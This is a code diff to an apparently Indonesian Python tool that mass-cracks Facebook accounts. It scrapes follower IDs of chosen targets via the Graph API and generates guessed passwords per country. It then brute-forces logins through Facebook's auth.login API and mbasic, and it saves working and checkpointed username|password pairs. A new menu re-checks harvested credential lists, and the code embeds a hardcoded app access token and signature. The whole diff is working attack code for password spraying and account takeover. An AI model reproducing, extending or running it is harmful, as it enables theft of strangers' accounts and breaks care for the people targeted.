@@ -39,7 +39,6 @@ from concurrent.futures import ThreadPoolExecutor as ThreadPool
 from datetime import date
 from datetime import datetime
 current = datetime.now()
-
 #BAHANTAMBAHAN
 me = ("Mr.Risky")
 no_me = ("6283143565470")
@@ -56,6 +55,8 @@ k = "\033[0;36m" # kuning
 b = "\x1b[0;34m" # biru
 u = "\x1b[0;35m" # ungu
 o = "\033[0;32m" # biru muda
+bulat=(k+"["+p+"•"+k+"] "+p)   #   [•]
+war=(k+"["+p+"!"+k+"] "+p)  # [!]
 #p = "\x1b[0;37m" # putih
 #m = "\x1b[0;31m" # merah
 #h = "\x1b[0;32m" # hijau
@@ -85,8 +86,6 @@ else:
 logo = ("""
 ANGGAP-AJA-LOGO
 """)
-
-
 
 ##############################################################################
 #			      !!!! WARNING !!!!				     #
@@ -271,6 +270,8 @@ def choose_country():
 
 def bash(dum):
 	os.system(dum)
+def logo():
+    banner()
 
 def banner():
     print(f"""{c}______________  ___________ __________
@@ -303,6 +304,7 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.03)
 def menu():
+    os.system("mkdir Hasil/")
     try:
         toket = open("login.txt","r").read()
         otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
@@ -313,6 +315,7 @@ def menu():
         print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e))
         logs()
     ip = requests.get("https://api.ipify.org").text
+    country=requests.get("http://ip-api.com/json/").json()["country"]
     ngr = open('.pass.txt', 'r').read()
     if "id" in ngr:
         negara = "Indonesia"
@@ -325,16 +328,20 @@ def menu():
     os.system("clear")
     banner()
 #    print((k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p))
-    print((k+"\n["+p+"++"+k+"]"+p+" Your ID : "+id))
-    print((k+"["+p+"++"+k+"]"+p+" Your IP : "+ip))
-    print((k+"["+p+"++"+k+"]"+p+" Status  : "+i+"Trial"+p))
+    print((k+"\n["+p+"++"+k+"]"+p+" Your ID       : "+id))
+    print((k+"["+p+"++"+k+"]"+p+" Your IP       : "+ip))
+    print((k+"["+p+"++"+k+"]"+p+" Country       : "+country))
+    print((k+"["+p+"++"+k+"]"+p+" Status        : "+i+"Trial-02"+p))
+    print((k+"["+p+"++"+k+"]"+p+" You Join Date : "+i+durasi+p))
     print((k+"["+p+"••"+k+"]"+u+"==================================================="+c+"⟩⟩"))
-    print((k+"\n["+p+"01"+k+"]"+p+" Crack ID From Public/Friend"))
-    print((k+"["+p+"02"+k+"]"+p+" Crack ID From Followers"))
-    print((k+"["+p+"03"+k+"]"+p+" Crack ID From FileList"))
-    print((k+"["+p+"04"+k+"]"+p+" View Crack Results"))
-    print((k+"["+p+"05"+k+"]"+p+" Settings User Agent"))
-    print((k+"["+p+"00"+k+"]"+p+" Logout (REMOVE TOKEN)"))
+    print((k+"\n["+p+"01"+k+"]"+p+" Crack ID From Public/Friend "+k+"[ "+m+"Not yet updated "+k+"]"))
+    print((k+"["+p+"02"+k+"]"+p+" Crack ID From Followers"+k+"[ "+i+"Already updated "+k+"]"))
+    print((k+"["+p+"03"+k+"]"+p+" Crack ID From FileList"+k+"[ "+m+"Not yet updated "+k+"]"))
+    print((k+"["+p+"04"+k+"]"+p+" Checkpoint Detector"+k+"[ "+m+"Menu New "+k+"]"))
+    print((k+"["+p+"05"+k+"]"+p+" View Crack Results"))
+    print((k+"["+p+"06"+k+"]"+p+" Settings User Agent"))
+    print((k+"["+p+"07"+k+"]"+p+" Donasi "+k+"("+m+"Please bro"+k+")"))
+    print((k+"["+p+"00"+k+"]"+p+" Logout "+k+"("+m+"REMOVE TOKEN"+k+")"))
     choose_menu()
 
 def choose_menu():
@@ -352,10 +359,19 @@ def choose_menu():
 		dumai = input(k+'['+p+'•'+k+']'+p+' Nama File : '+q)
 		filecoba(dumai)
 	elif r=="4" or r=="04":
-		ress()
+		Login_user()
 	elif r=="5" or r=="05":
+		ress()
+	elif r=="6" or r=="06":
 		os.system("rm -rf ua_me.txt")
 		menu_user_agent()
+	elif r=="7" or r=="07":
+		jalan(war+"Guna Doanv Kaga Donasi :v")
+		jalan(war+"Anda Akan DiAlih KeGithub Dumai-991 ( READMD.md )")
+		time.sleep(1.75)
+		os.system("xdg-open https://github.com/Dumai-991/Dumai-991/blob/main/README.md")
+		time.sleep(1.75)
+		menu()
 	elif r=="FAKEPRINT":
 		print(f"""
 [•] Followers ID Target : 53726XXXX
@@ -425,6 +441,59 @@ def choose_menu():
 	else:
 		print((k+"["+p+"!"+k+"]"+p+" Wrong Input"))
 		menu()	
+
+def Login_user():
+	try:
+		import requests
+	except Exception as E:
+		print ("ERROR: "+str(E))
+
+	banner = (f"""
+{c}╭━━━┳╮╱╭┳━━━┳━━━┳╮╭━{p}┳━━━┳━━━┳━━┳━╮╱╭┳━━━━╮
+{c}┃╭━╮┃┃╱┃┃╭━━┫╭━╮┃┃┃╭{p}┫╭━╮┃╭━╮┣┫┣┫┃╰╮┃┃╭╮╭╮┃
+{c}┃┃╱╰┫╰━╯┃╰━━┫┃╱╰┫╰╯╯{p}┃╰━╯┃┃╱┃┃┃┃┃╭╮╰╯┣╯┃┃╰╯
+{c}┃┃╱╭┫╭━╮┃╭━━┫┃╱╭┫╭╮┃{p}┃╭━━┫┃╱┃┃┃┃┃┃╰╮┃┃╱┃┃
+{c}┃╰━╯┃┃╱┃┃╰━━┫╰━╯┃┃┃╰{p}┫┃╱╱┃╰━╯┣┫┣┫┃╱┃┃┃╱┃┃
+{c}╰━━━┻╯╱╰┻━━━┻━━━┻╯╰━{p}┻╯╱╱╰━━━┻━━┻╯╱╰━╯╱╰╯
+{k}INFO : {p}GUNA MENU INI ADALAH, UNTUK LOGIN{m} ╔═══╦═══╦════╦═══╦═══╦════╦═══╦═══╗
+{p}DAN UNTUK CHECK POINT ( SENSINYA ).      {m}╚╗╔╗║╔══╣╔╗╔╗║╔══╣╔═╗║╔╗╔╗║╔═╗║╔═╗,║
+{p}SILAHKAN GUNAKAN DENGAN BIJAK !!         {m}─║║║║╚══╬╝║║╚╣╚══╣║─╚╩╝║║╚╣║─║║╚═╝║
+{m}BY : {q}MR.RISKY			         {m}─║║║║╔══╝─║║─║╔══╣║─╔╗─║║─║║─║║╔╗╔╝
+{m}@Dumai-991			         {m}╔╝╚╝║╚══╗─║║─║╚══╣╚═╝║─║║─║╚═╝║║║╚╗
+				         {m}╚═══╩═══╝─╚╝─╚═══╩═══╝─╚╝─╚═══╚╝╚
+{p}Jarak Memisah {k}username{i}|{k}password""")
+	print (banner)
+	print(war+"\nContoh File Yang Bisa DiGunakan !! : ")
+	os.system("ls Hasil/*.txt")
+	print (bulat+'Masukan Nama Filenya Contoh : CP-'+durasi)
+	list = input(war+"FileList : ")
+	try:
+		total = open(list).readlines()
+		print (bulat+"Total Akun : \033[33m"+str(len(total)))
+	except IOError:
+		print (war+"List Not Found ")
+		sys.exit()
+	else:
+		try:
+			gas(list)
+		except KeyboardInterrupt:
+			print (war+"Key Interrupt")
+			sys.exit()
+
+class gas(list):
+	def __init__(self,list):
+		akun = open(list).read().splitlines()
+		for acc in akun:
+			p=acc.split("|")
+			self.check(p[0],p[-1])
+	def check(self,email,pw):
+		data={"user":email,"pw":pw}
+		r = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+str(data['user'])+"&locale=en_US&password="+str(data['pw'])+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+		j = json.loads(r.text)
+		if "www.facebook.com" in j["error_msg"]:
+			print (war+"Checkpoint : "+k+email+"|"+pw)
+		else:
+			print (war+"Login Failed : "+m+email+"|"+pw)
 def Get_Ua():
 	menu_user_agent()
 
@@ -436,11 +505,13 @@ def menu_user_agent():
 		toket=open("ua_me.txt","r").read()
 	except IOError:
 		os.system("rm -rf ua_me.txt")
-		jalan("User Agent Broken")
-		jalan(c+"Created By Risky")
-		print(k+"Silahkan Pilih User Agent Untuk DiGunakan !!")
-		print(k+"Please Select A User Agent To Use\n"+p)
-		print(k+"["+p+"01"+k+"]"+p+" Made by Risky")
+		os.system("clear")
+		logo()
+		jalan(f"{bulat}User Agent Broken")
+		jalan(f"{bulat}Created By Risky")
+		print(f"{war}Silahkan Pilih User Agent Untuk DiGunakan !!")
+		print(f"{war}Please Select A User Agent To Use\n"+p)
+		print(k+"["+p+"01"+k+"]"+p+" Made by Risky "+k+"( "+p+"Recommended"+k+" )")
 		print(k+"["+p+"02"+k+"]"+p+" Made by Dapunta")
 		print(k+"["+p+"03"+k+"]"+p+" Made by Angga")
 		print(k+"["+p+"04"+k+"]"+p+" Change User Agent")
@@ -484,15 +555,49 @@ def filecoba(risky):
 	except Exception as e:
 		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
 def follow():
+	os.system("clear")
+	logo()
+	print(f"{war}Ketik ( menu ) Untuk Kembali KeMenu Utaman")
+	jalan(f"{war}Silahkan Pilih Mau Dump ID !! [ 1 - 5 ]")
+	v = input(f'{bulat}Jumlah : ')
+	if v in ("", " ", "  "):
+		follow()
+	elif v=="1" or v=="01":
+		Follow__01()
+	elif v=="2" or v=="02":
+		Follow__02()
+	elif v=="3" or v=="03":
+		Follow__03()
+	elif v=="4" or v=="04":
+		jalan("Dump 4 ID Sedang DiPerbaiki !!")
+#		Follow__04()
+	elif v=="5" or v=="05":
+		Khusus()
+	elif v=="MENU" or v=="menu":
+		menu()
+	else:
+		jalan("wrong")
+		follow()
+
+def Follow__02():
+	jalan(war+"Made by Risky And Dumai-991")
+	idt = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 01 : ")
+	while len(idt) < 7:
+		jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 7 Angka !!"))
+		time.sleep(1.75)
+		Follow__02()
+	idt2 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 02 : ")
+	while len(idt2) < 7:
+		jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 7 Angka !!"))
+		time.sleep(1.75)
+		Follow__02()
+	jalan(k+"["+p+"•"+k+"]"+p+" Recommended For 1500 Dump ID")
+	max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
+	while len(max_id) < 3:
+		jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 7 Angka !!"))
+		time.sleep(1.75)
+		max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
 	try:
-		toket=open("login.txt","r").read()
-	except IOError:
-		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
-		print(k+"["+p+"!"+k+"]"+p+" Cookie/Token Rusak")
-		os.system("rm -rf login.txt")
-		logs()
-	try:
-		idt = input(k+"\n["+p+"•"+k+"]"+p+" Followers ID Target : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -501,7 +606,290 @@ def follow():
 			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
 			print((k+"\n[ "+p+"Back"+k+" ]"+p))
 			publik()
-		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
+		r=requests.get("https://graph.facebook.com/"+idt2+"/subscribers?limit="+max_id+"&access_token="+toket)
+		z=json.loads(r.text)
+		ys = open(qq , "a+")#.replace(" ","_")
+		for a in z["data"]:
+			id.append(a["id"]+"<=>"+a["name"])
+			ys.write(a["id"]+"<=>"+a["name"]+"\n")
+		ys.close()
+		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
+		try:
+			try:
+				jok = requests.get("https://graph.facebook.com/"+idt2+"?access_token="+toket)
+				op = json.loads(jok.text)
+				print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+			except KeyError:
+				print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
+				print((k+"\n[ "+p+"Back"+k+" ]"+p))
+				publik()
+				r=requests.get("https://graph.facebook.com/"+idt2+"/subscribers?limit="+max_id+"&access_token="+toket)
+			z=json.loads(r.text)
+			ys = open(qq , "a+")#.replace(" ","_")
+			for a in z["data"]:
+				id.append(a["id"]+"<=>"+a["name"])
+				ys.write(a["id"]+"<=>"+a["name"]+"\n")
+			ys.close()
+			print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
+			return pilihcrack(qq)
+		except Exception as e:
+			input(f'{war} ID 01 Error {k}( {p}Enter To Exit {k})')
+			exit()
+	except Exception as e: 
+		input(f'{war} ID 01 Error {k}( {p}Enter To Exit {k})')
+		exit()
+def Follow__03():
+	jalan(war+"Made by Risky And Dumai-991")
+	idt = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 01 : ")
+	while len(idt) < 7:
+		jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 7 Angka !!"))
+		time.sleep(1.75)
+		Follow__03()
+	idt2 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 02 : ")
+	while len(idt2) < 7:
+		jalan("Kosong ??" if idt2 in (""," ") else (war+"Masukan 7 Angka !!"))
+		time.sleep(1.75)
+		Follow__03()
+	idt3 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 03 : ")
+	while len(idt3) < 7:
+		jalan("Kosong ??" if idt3 in (""," ") else (war+"Masukan 7 Angka !!"))
+		time.sleep(1.75)
+		Follow__03()
+	jalan(k+"["+p+"•"+k+"]"+p+" Recommended For 1500 Dump ID")
+	max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
+	while len(max_id) < 3:
+		jalan("Kosong ??" if max_id in (""," ") else (war+"Masukan 3 Angka !!"))
+		time.sleep(1.75)
+		max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
+	try:
+		toket=open("login.txt","r").read()
+	except IOError:
+		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
+		print(k+"["+p+"!"+k+"]"+p+" Cookie/Token Rusak")
+		os.system("rm -rf login.txt")
+		logs()
+	try:
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+		except KeyError:
+			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
+			print((k+"\n[ "+p+"Back"+k+" ]"+p))
+			publik()
+		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+max_id+"&access_token="+toket)
+		id = []
+		z=json.loads(r.text)
+		qq = (op["first_name"]+".json").replace(" ","_")
+		ys = open(qq , "w")#.replace(" ","_")
+		for a in z["data"]:
+			id.append(a["id"]+"<=>"+a["name"])
+			ys.write(a["id"]+"<=>"+a["name"]+"\n")
+		ys.close()
+		try:
+			try:
+				jok = requests.get("https://graph.facebook.com/"+idt2+"?access_token="+toket)
+				op = json.loads(jok.text)
+				print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+			except KeyError:
+				print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
+				print((k+"\n[ "+p+"Back"+k+" ]"+p))
+				publik()
+				r=requests.get("https://graph.facebook.com/"+idt2+"/subscribers?limit="+max_id+"&access_token="+toket)
+			z=json.loads(r.text)
+			ys = open(qq , "a+")#.replace(" ","_")
+			for a in z["data"]:
+				id.append(a["id"]+"<=>"+a["name"])
+				ys.write(a["id"]+"<=>"+a["name"]+"\n")
+			ys.close()
+			try:
+				try:
+					jok = requests.get("https://graph.facebook.com/"+idt3+"?access_token="+toket)
+					op = json.loads(jok.text)
+					print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+				except KeyError:
+					print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
+					print((k+"\n[ "+p+"Back"+k+" ]"+p))
+					publik()
+					r=requests.get("https://graph.facebook.com/"+idt3+"/subscribers?limit="+max_id+"&access_token="+toket)
+				z=json.loads(r.text)
+				ys = open(qq , "a+")#.replace(" ","_")
+				for a in z["data"]:
+					id.append(a["id"]+"<=>"+a["name"])
+					ys.write(a["id"]+"<=>"+a["name"]+"\n")
+				ys.close()
+				print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
+				return pilihcrack(qq)
+			except Exception as e:
+				input(f'{war} ID 01 Error {k}( {p}Enter To Exit {k})')
+				exit()
+		except Exception as e:
+			input(f'{war} ID 01 Error {k}( {p}Enter To Exit {k})')
+			exit()
+	except Exception as e: 
+		input(f'{war} ID 01 Error {k}( {p}Enter To Exit {k})')
+		exit()
+def Khusus():
+	jalan("Made by Risky And Dumai-991")
+	print(f"{war}Ketik ( menu ) Untuk Kembali KeMenu Utaman")
+	idt = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 01 : ")
+	while len(idt) < 7:
+		jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 7 Angka !!"))
+		time.sleep(1.75)
+		Khusus()
+	idt2 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 02 : ")
+	while len(idt2) < 7:
+		jalan("Kosong ??" if idt2 in (""," ") else (war+"Masukan 7 Angka !!"))
+		time.sleep(1.75)
+		Khusus()
+	idt3 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 03 : ")
+	while len(idt3) < 7:
+		jalan("Kosong ??" if idt3 in (""," ") else (war+"Masukan 7 Angka !!"))
+		time.sleep(1.75)
+		Khusus()
+	idt4 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 04 : ")
+	while len(idt4) < 7:
+		jalan("Kosong ??" if idt4 in (""," ") else (war+"Masukan 7 Angka !!"))
+		time.sleep(1.75)
+		Khusus()
+	idt5 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 05 : ")
+	while len(idt5) < 7:
+		jalan("Kosong ??" if idt5 in (""," ") else (war+"Masukan 7 Angka !!"))
+		time.sleep(1.75)
+		Khusus()
+	jalan(k+"["+p+"•"+k+"]"+p+" Recommended For 1500 Dump ID")
+	max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
+	while len(max_id) < 3:
+		jalan("Kosong ??" if max_id in (""," ") else (war+"Masukan 3 Angka !!"))
+		time.sleep(1.75)
+		max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
+	try:
+		toket=open("login.txt","r").read()
+	except IOError:
+		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
+		print(k+"["+p+"!"+k+"]"+p+" Cookie/Token Rusak")
+		os.system("rm -rf login.txt")
+		logs()
+	try:
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+		except KeyError:
+			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
+			print((k+"\n[ "+p+"Back"+k+" ]"+p))
+			publik()
+		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+max_id+"&access_token="+toket)
+		id = []
+		z=json.loads(r.text)
+		qq = (op["first_name"]+".json").replace(" ","_")
+		ys = open(qq , "w")#.replace(" ","_")
+		for a in z["data"]:
+			id.append(a["id"]+"<=>"+a["name"])
+			ys.write(a["id"]+"<=>"+a["name"]+"\n")
+		ys.close()
+		try:
+			try:
+				jok = requests.get("https://graph.facebook.com/"+idt2+"?access_token="+toket)
+				op = json.loads(jok.text)
+				print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+			except KeyError:
+				print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
+			r=requests.get("https://graph.facebook.com/"+idt2+"/subscribers?limit="+max_id+"&access_token="+toket)
+			z=json.loads(r.text)
+			ys = open(qq , "a+")#.replace(" ","_")
+			for a in z["data"]:
+				id.append(a["id"]+"<=>"+a["name"])
+				ys.write(a["id"]+"<=>"+a["name"]+"\n")
+			ys.close()
+			try:
+				try:
+					jok = requests.get("https://graph.facebook.com/"+idt3+"?access_token="+toket)
+					op = json.loads(jok.text)
+					print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+				except KeyError:
+					print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
+				r=requests.get("https://graph.facebook.com/"+idt3+"/subscribers?limit="+max_id+"&access_token="+toket)
+				z=json.loads(r.text)
+				ys = open(qq , "a+")#.replace(" ","_")
+				for a in z["data"]:
+					id.append(a["id"]+"<=>"+a["name"])
+					ys.write(a["id"]+"<=>"+a["name"]+"\n")
+				ys.close()
+				try:
+					try:
+						jok = requests.get("https://graph.facebook.com/"+idt4+"?access_token="+toket)
+						op = json.loads(jok.text)
+						print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+					except KeyError:
+						print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
+					r=requests.get("https://graph.facebook.com/"+idt4+"/subscribers?limit="+max_id+"&access_token="+toket)
+					z=json.loads(r.text)
+					ys = open(qq , "a+")#.replace(" ","_")
+					for a in z["data"]:
+						id.append(a["id"]+"<=>"+a["name"])
+						ys.write(a["id"]+"<=>"+a["name"]+"\n")
+					ys.close()
+					try:
+						try:
+							jok = requests.get("https://graph.facebook.com/"+idt5+"?access_token="+toket)
+							op = json.loads(jok.text)
+							print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+						except KeyError:
+							print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
+						r=requests.get("https://graph.facebook.com/"+idt5+"/subscribers?limit="+max_id+"&access_token="+toket)
+						z=json.loads(r.text)
+						ys = open(qq , "a+")#.replace(" ","_")
+						for a in z["data"]:
+							id.append(a["id"]+"<=>"+a["name"])
+							ys.write(a["id"]+"<=>"+a["name"]+"\n")
+						ys.close()
+						print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
+						return pilihcrack(qq)
+					except Exception as e:
+						input(f'{war} ID 05 Error {k}( {p}Enter To Exit {k})')
+						exit()
+				except Exception as e:
+					input(f'{war} ID 04 Error {k}( {p}Enter To Exit {k})')
+					exit()
+			except Exception as e:
+				input(f'{war} ID 03 Error {k}( {p}Enter To Exit {k})')
+				exit()
+		except Exception as e:
+			input(f'{war} ID 02 Error {k}( {p}Enter To Exit {k})')
+			exit()
+	except Exception as e:
+		input(f'{war} ID 01 Error {k}( {p}Enter To Exit {k})')
+		exit()
+def Follow__01():
+	idt = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 01 : ")
+	while len(idt) < 7:
+		jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 7 Angka !!"))
+		time.sleep(1.75)
+		Follow__01()
+	jalan(k+"["+p+"•"+k+"]"+p+" Recommended For 1500 Dump ID")
+	max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
+	while len(max_id) < 3:
+		jalan("Kosong ??" if max_id in (""," ") else (war+"Wajib 3 Angka !!"))
+		time.sleep(1.75)
+		max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
+	try:
+		toket=open("login.txt","r").read()
+	except IOError:
+		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
+		print(k+"["+p+"!"+k+"]"+p+" Cookie/Token Rusak")
+		os.system("rm -rf login.txt")
+		logs()
+	try:
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+		except KeyError:
+			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
+			print((k+"\n[ "+p+"Back"+k+" ]"+p))
+			publik()
+		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+max_id+"&access_token="+toket)
 		id = []
 		z=json.loads(r.text)
 		qq = (op["first_name"]+".json").replace(" ","_")
@@ -512,15 +900,14 @@ def follow():
 		ys.close()
 		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
 		return pilihcrack(qq)
-	except Exception as e:
-		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
-
-
+	except Exception as e: 
+		input(f'{war} ID 01 Error {k}( {p}Enter To Exit {k})')
+		exit()
 def publik():
 	try:
 		toket=open("login.txt","r").read()
 	except IOError:
-#		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
+		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
 		print(k+"["+p+"!"+k+"]"+p+" Cookie/Token Rusak")
 		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
 		os.system("rm -rf login.txt")
@@ -548,27 +935,20 @@ def publik():
 		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
 		return pilihcrack(qq)
 	except Exception as e:
-		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
+		input(f'{war} ID 01 Error {k}( {p}Enter To Exit {k})')
+		exit()
 def pilihcrack(file):
   print((k+"\n["+p+"1"+k+"]"+p+" Api "))
-#  print((k+"["+p+"2"+k+"]"+p+" Api + TTL ("+k+"Fast"+p+")"))
   print((k+"["+p+"2"+k+"]"+p+" Mbasic "))
-#  print((k+"["+p+"4"+k+"]"+p+" Mbasic + TTL ("+k+"Slow"+p+")"))
-#  print((k+"["+p+"5"+k+"]"+p+" Free Facebook ("+k+"Super Slow"+p+")"))
+  print((k+"["+p+"3"+k+"]"+p+" Mbasic + Ttl + Cookies "+k+"( "+p+"COME SOON"+k+" )"))
   krah=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
   if krah in[""]:
     print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
     pilihcrack(file)
   elif krah in["1","01"]:
     bapi(file)
-#  elif krah in["2","02"]:
-    bapittl(file)
   elif krah in["2","02"]:
     crack(file)
-#  elif krah in["4","04"]:
-    crackttl(file)
-#  elif krah in["5","05"]:
-    crackffb(file)
   else:
     print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
     pilihcrack(file)
@@ -586,7 +966,7 @@ def generate(text):
 				results.append(i+"12345")
 			else:
 				results.append(i+"321")
-				results.append(i+"54321")
+				results.append(i+"4321")
 				results.append(i)
 				if "id" in ct:
 					results.append("sayang")
@@ -611,6 +991,22 @@ def generate(text):
 					results.append("iloveyou")
 					results.append("passwords")
 	return results
+def kata_risky():
+    ngr = open('.pass.txt', 'r').read()
+    if "id" in ngr:
+        negara = "Indonesia"
+        dumai = "name123,name1234,name12345,name321,name4321,sayang,bismillah,anjing,kontol,indonesia,bajingan,123456"
+    elif "bd" in ngr:
+        negara = "Bangladesh/India"
+        dumai = "102030,556677,000786,786786"
+    elif "pk" in ngr:
+        negara = "Pakistan"
+        dumai = "000786,786786,pakistan"
+    elif "us" in ngr:
+        negara = "USA"
+        dumai = "passwords,qwerty,iloveyou,123456"
+    print(war+"You Are Using A Password From The Country "+k+negara)
+    print(war+"Password Now Used : "+k+dumai)
 class bapi:
   def __init__(self,isifile):
     self.setpw = False
@@ -619,6 +1015,7 @@ class bapi:
     self.loop = 0
     self.krah(isifile)
   def krah(self,isifile):
+    kata_risky()
     print(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p))
     while True:
       f=input(k+"["+p+"•"+k+"]"+p+" Dumai-991 ?: ")
@@ -681,19 +1078,19 @@ class bapi:
     api = "https://b-api.facebook.com/method/auth.login"
     response = requests.get(api, params=params)
     if re.search("(EAAA)\\w+", response.text):
-      self.ok.append(username + " • " + password)
-      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
-      ok.append(username + " • " + password)
+      self.ok.append(username + "|" + password)
+      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s|%s %s               "%(username,password,N)))
+      ok.append(username + "|" + password)
       save = open("Hasil/OK-"+durasi+".txt", "a")
-      save.write(str(username) + " • " + str(password) + "\n")
+      save.write(str(username) + "|" + str(password) + "\n")
       save.close()
       return True
     else:
       if "www.facebook.com" in response.json()["error_msg"]:
-        self.cp.append(username + " • " + password)
-        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s %s               "%(username,password,N)))
+        self.cp.append(username + "|" + password)
+        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s|%s %s               "%(username,password,N)))
         save = open("Hasil/CP-"+durasi+".txt", "a+")
-        save.write(str(username) + " • " + str(password) + "\n")
+        save.write(str(username) + "|" + str(password) + "\n")
         save.close()
         return True
     return False
@@ -728,6 +1125,7 @@ class crack:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
+		kata_risky()
 		print(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p))
 		while True:
 			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
@@ -792,16 +1190,16 @@ class crack:
 				log=mbasic(fl.get("id"),
 					i,"https://mbasic.facebook.com")
 				if log.get("status")=="cp":
-					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
-					self.cp.append("%s • %s"%(fl.get("id"),i))
+					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s|%s               "%(fl.get("id"),i)))
+					self.cp.append("%s|%s"%(fl.get("id"),i))
 					open("Hasil/CP-"+durasi+".txt","a+").write(
-						"%s • %s\n"%(fl.get("id"),i))
+						"%s|%s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
-					self.ada.append("%s • %s"%(fl.get("id"),i))
